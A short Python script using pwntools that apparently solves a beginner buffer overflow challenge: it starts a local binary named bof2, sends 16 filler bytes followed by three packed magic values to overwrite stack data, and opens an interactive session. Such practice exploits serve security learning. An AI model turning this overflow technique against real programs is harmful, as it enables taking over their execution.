from pwn import *

p = process('./bof2')
input()
payload = b'a'*16 + p64(0xCAFEBABE) + p64(0xDEADBEEF) + p64(0x13371337)

p.sendafter(b'> ', payload)
p.interactive()


